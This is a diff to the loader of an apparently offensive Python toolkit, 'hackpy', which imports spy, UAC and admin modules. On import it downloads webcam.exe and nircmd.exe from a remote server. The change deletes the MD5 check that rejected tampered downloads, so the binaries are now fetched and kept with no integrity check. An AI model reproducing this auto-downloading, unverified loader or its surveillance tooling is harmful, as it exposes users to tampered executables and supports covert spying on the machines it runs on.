@@ -9,9 +9,8 @@ logo = (r"""
 
 # Import hackpy modules
 from hackpy.spy         import *
-from hackpy.uac        import *
+from hackpy.uac         import *
 from hackpy.info        import *
-from hackpy.hash        import *
 from hackpy.file        import *
 from hackpy.power       import *
 from hackpy.admin       import *
@@ -36,20 +35,13 @@ def main():
             file.mkdir(module_location + '\\' + folder)
 
     # Load all modules
-    for module, hash in module_hashes.items():
+    for module in ('webcam.exe', 'nircmd.exe'):
         module_path = module_location + '\\executable\\' + module
         if not file.exists(module_path):
             try:
                 wget(server_url + '/HackPy/' + module, output = module_path)
             except:
                 raise ConnectionError('Failed connect to HackPy server while downloading modules...')
-            else:
-                normal_hash   = hash
-                received_hash = md5(module_path)
-                if (normal_hash != received_hash):
-                    file.remove(module_path)
-                    raise Warning('\n\nThe hash of the downloaded module \"' + module + '\" did not match the expected.\n * Normal hash  : ' + normal_hash + '\n * Received hash: ' + received_hash)
-
 if __name__ != '__main__':
     main()
 else:
